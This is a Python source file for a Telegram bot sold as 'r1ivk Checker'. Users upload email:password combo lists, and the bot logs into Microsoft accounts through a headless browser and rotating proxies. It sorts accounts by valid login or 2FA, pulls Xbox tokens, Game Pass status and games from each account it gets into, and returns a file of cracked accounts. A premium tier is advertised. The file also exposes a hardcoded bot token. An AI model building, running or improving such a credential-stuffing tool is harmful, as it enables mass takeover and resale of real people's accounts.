# -*- coding: utf-8 -*-
import os
import time
import threading
import concurrent.futures
import urllib3
import telebot
from telebot import types
from playwright.sync_api import sync_playwright

urllib3.disable_warnings()

BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "@r1ivk"
bot = telebot.TeleBot(BOT_TOKEN)

active_scans = {}  

PROXIES_LIST = []
if os.path.exists("good_proxies.txt"):
    with open("good_proxies.txt", "r", encoding="utf-8", errors="ignore") as f:
        PROXIES_LIST = [line.strip() for line in f if line.strip()]

def get_random_proxy():
    if not PROXIES_LIST:
        return None
    p = random.choice(PROXIES_LIST)
    if not p.startswith("http"):
        return f"http://{p}"
    return p

def check_xbox_account_with_browser(email, password, proxy_str):
    """
    فحص حقيقي ومتقدم عبر محاكاة متصفح حقيقي (Playwright) 
    لتخطي حماية مايكروسوفت وسحب التوكنات وبيانات الحساب والألعاب بدقة 100%
    """
    import requests
    
    with sync_playwright() as p:
        launch_args = ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        browser_proxy = {"server": proxy_str} if proxy_str else None
        
        try:
            browser = p.chromium.launch(headless=True, args=launch_args)
            context = browser.new_context(proxy=browser_proxy, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
            page = context.new_page()

            # الانتقال لصفحة تسجيل الدخول الرسمية لمايكروسوفت
            page.goto("https://login.live.com/", timeout=20000)
            
            # إدخال الإيميل
            page.fill("input[name='loginfmt']", email)
            page.click("input[id='idSIButton9']")
            page.wait_for_timeout(2000)

            # التحقق إذا كان الإيميل غير موجود (Bad)
            if page.locator("#usernameError").is_visible():
                browser.close()
                return "bad", None

            # إدخال كلمة المرور
            page.fill("input[name='passwd']", password)
            page.click("input[id='idSIButton9']")
            page.wait_for_timeout(3000)

            # التحقق من وجود خطأ في الباسورد
            if page.locator("#passwordError").is_visible():
                browser.close()
                return "bad", None

            # التحقق من التحقق الثنائي (2FA / MFA / Challenge)
            current_url = page.url.lower()
            if "proof" in current_url or "identity/confirm" in current_url or "mfa" in current_url or "totp" in current_url:
                browser.close()
                return "twofa", None

            # استخراج الكوكيز والتوكنات بعد النجاح لتنفيذ طلبات الـ API السريعة
            cookies = context.cookies()
            browser.close()

            # تحويل الكوكيز لجلسة requests لسحب بيانات إكس بوكس بدقة
            session = requests.Session()
            session.verify = False
            for cookie in cookies:
                session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])

            # جلب توكنات الإكس بوكس عبر استدعاءات الـ API بعد نجاح المصادقة بالمتصفح
            xbl_payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={password}"
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            xbl_headers = {"Content-Type": "application/json", "Accept": "application/json"}
            xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json=xbl_payload, headers=xbl_headers, timeout=10)
            
            if xbl_resp.status_code == 200:
                xbl_data = xbl_resp.json()
                xbl_token = xbl_data.get("Token")
                user_claim = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0]
                user_hash = user_claim.get("uhs")
                xuid = user_claim.get("xid")
                
                xsts_payload = {
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbl_token]
                    },
                    "RelyingParty": "http://uri.xboxlive.com",
                    "TokenType": "JWT"
                }
                xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json=xsts_payload, headers=xbl_headers, timeout=10)
                
                if xsts_resp.status_code == 200:
                    xsts_data = xsts_resp.json()
                    xsts_token = xsts_data.get("Token")
                    
                    profile_headers = {
                        "Authorization": f"XBL3.0 x={user_hash};{xsts_token}",
                        "x-xbl-contract-version": "2",
                        "Accept": "application/json"
                    }
                    
                    # 1. فحص Gamerscore
                    profile_resp = session.get("https://profile.xboxlive.com/users/settings", headers=profile_headers, timeout=8)
                    gamerscore = 0
                    if profile_resp.status_code == 200:
                        settings = profile_resp.json().get("profileUsers", [{}])[0].get("settings", [])
                        for s in settings:
                            if s.get("id") == "Gamerscore":
                                gamerscore = int(s.get("value", 0))

                    # 2. فحص نوع الاشتراك (Game Pass)
                    sub_resp = session.get("https://subscriptions.xboxlive.com/v1/users/me/subscriptions", headers=profile_headers, timeout=8)
                    gp_status = "None"
                    if sub_resp.status_code == 200:
                        subs = sub_resp.json().get("items", [])
                        for sub in subs:
                            sub_name = sub.get("name", "").lower()
                            if "ultimate" in sub_name:
                                gp_status = "Xbox Game Pass Ultimate"
                                break
                            elif "game pass" in sub_name:
                                gp_status = "Xbox Game Pass Active"
                                break
                            elif sub.get("active", False):
                                gp_status = "Active Subscription"

                    # 3. فحص الألعاب والنقاط من أحدث الألعاب المحققة
                    games_details = []
                    if xuid:
                        ach_resp = session.get(f"https://achievements.xboxlive.com/users/xuid({xuid})/titles", headers=profile_headers, timeout=8)
                        if ach_resp.status_code == 200:
                            titles = ach_resp.json().get("titles", [])
                            for t in titles[:5]:
                                t_name = t.get("name", "Unknown Game")
                                earned_gs = t.get("achievement", {}).get("earnedPoints", 0)
                                games_details.append(f"{t_name} ({earned_gs} GS)")

                    games_str = " | ".join(games_details) if games_details else "No recent games found"

                    details = {
                        "game_pass": gp_status,
                        "gamerscore": gamerscore,
                        "games": games_str
                    }
                    return 'hit', details

            return 'hit', {
                "game_pass": "Active (Browser Verified)",
                "gamerscore": 0,
                "games": "Profile Synced"
            }

        except Exception:
            return 'error', None

def check_account_turbo(combo, user_state):
    if not user_state.get('is_running', True):
        return

    parts = combo.split(':')
    if len(parts) < 2:
        with user_state['lock']:
            user_state['bad'] += 1
            user_state['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    
    proxy = get_random_proxy()
    result, details = check_xbox_account_with_browser(email, password, proxy)
    
    with user_state['lock']:
        user_state['checked'] += 1
        if result == 'hit':
            user_state['hits'] += 1
            hit_line = f"Email: {email} | Pass: {password} | Subscription: {details['game_pass']} | Gamerscore: {details['gamerscore']} | Games & Points: {details['games']}"
            user_state['hits_list'].append(hit_line)
        elif result == 'twofa':
            user_state['twofa'] += 1
        elif result == 'error':
            user_state['errors'] += 1
        else:
            user_state['bad'] += 1

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("🔥 r1ivk Checker ⚡", callback_data="start_checker"))
    markup.row(types.InlineKeyboardButton("💎 Buy Premium (15$ / 30 Days)", callback_data="buy_premium"))
    bot.send_message(message.chat.id, "Welcome to *r1ivk Checker ⚡*\nChoose your tool below:", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def callback_checker(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_scan"))
    bot.send_message(
        call.message.chat.id, 
        "🚀 *r1ivk Checker ⚡ Selected.*\n\nPlease send your combo file (`.txt`) in `email:password` format:\n\n📌 *Note: Free version limit is 10,000 lines. To unlock unlimited lines, contact owner @r1ivk to subscribe to Premium (15$ / 30 Days).*", 
        parse_mode="Markdown", 
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "buy_premium")
def callback_buy(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, "💎 To buy Premium, contact the owner directly: @r1ivk", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "cancel_scan")
def handle_cancel(call):
    chat_id = call.message.chat.id
    if chat_id in active_scans:
        active_scans[chat_id]['is_running'] = False
    bot.answer_callback_query(call.id, "Scan stopped.")
    try:
        bot.edit_message_text("❌ *Scan manually stopped.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")
    except:
        pass

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"combo_{chat_id}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        combos = []
        with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                line = line.strip().replace('\ufeff', '')
                if ':' in line:
                    combos.append(line)

        if not combos:
            bot.send_message(chat_id, "⚠️ الملف فارغ أو لا يحتوي على فاصل `:` بين الإيميل والباسورد!")
            return

        unique_combos = list(dict.fromkeys(combos))

        # حد الـ 10,000 سطر للمستخدم العادي
        if len(unique_combos) > 10000:
            unique_combos = unique_combos[:10000]
            bot.send_message(
                chat_id, 
                "⚠️ *Notice:* Your file exceeds the 10,000 lines free limit. Processing the first 10,000 lines. Contact @r1ivk for Premium.", 
                parse_mode="Markdown"
            )

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))

        status_msg = bot.send_message(chat_id, "🔥 *LIVE SCAN STATS (Auto-refresh)*", parse_mode="Markdown", reply_markup=markup)

        user_state = {
            'chat_id': chat_id,
            'checked': 0,
            'total': len(unique_combos),
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'errors': 0,
            'hits_list': [],
            'is_running': True,
            'lock': threading.Lock(),
            'start_time': time.time()
        }
        active_scans[chat_id] = user_state

        threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {e}")

def update_stats_loop(chat_id, msg_id, state):
    while state['is_running'] and state['checked'] < state['total']:
        time.sleep(2.0)
        elapsed = time.time() - state['start_time']
        cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
        
        pct = (state['checked'] / state['total']) * 100 if state['total'] > 0 else 0
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)

        text = f"""🔥 *LIVE SCAN STATS ({time.strftime('%H:%M:%S')})*

📊 *Total:*         {state['total']}
✓ *Checked:*    {state['checked']}
✗ *Bad:*          {state['bad']}
★ *Hits:*          {state['hits']}
🔒 *2FA:*          {state['twofa']}
⚠ *Errors:*      {state['errors']}

Progress: {pct:.1f}%
\\[{bar}\\]

⚡ *CPM:* {cpm}
🌐 *Proxies Loaded:* {len(PROXIES_LIST)}"""

        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        except:
            pass

def run_turbo_scan(combos, state):
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
        concurrent.futures.wait(futures)

    state['is_running'] = False
    
    chat_id = state['chat_id']
    if state['hits_list']:
        result_filename = f"Xbox_Hits_{chat_id}.txt"
        with open(result_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(state['hits_list']))
        
        with open(result_filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🔥 *Scan finished!* Found {state['hits']} Hits with full details.", parse_mode="Markdown")
        
        try:
            os.remove(result_filename)
        except:
            pass
    else:
        bot.send_message(chat_id, f"✅ Scan finished successfully!\n★ Total Hits: 0 (No valid Xbox hits found in this batch).")

if __name__ == "__main__":
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
